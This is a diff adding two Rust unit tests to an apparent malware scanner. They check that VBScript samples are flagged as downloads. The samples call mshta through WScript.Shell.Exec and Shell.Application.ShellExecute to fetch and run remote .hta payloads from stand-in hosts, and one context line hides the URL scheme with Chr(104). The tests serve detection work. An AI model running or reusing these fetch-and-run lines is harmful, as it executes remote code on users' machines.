@@ -17045,6 +17045,43 @@ sh.Run "mshta vbs-run-schemeless.example/payload.hta", 0, False"#;
     }
 
     #[test]
+    fn vbs_wscript_shell_exec_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Exec "mshta vbs-exec.example/payload.hta""#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://vbs-exec.example/payload.hta"
+            )),
+            "no Download trait from VBS WScript.Shell.Exec schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_shell_application_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "mshta", "vbs-shellexecute.example/payload.hta", "", "open", 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://vbs-shellexecute.example/payload.hta"
+            )),
+            "no Download trait from VBS Shell.Application.ShellExecute schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn standalone_vbs_shell_run_chr_concat_url_extracted() {
         let vbs = br#"Dim cmd
 cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta"
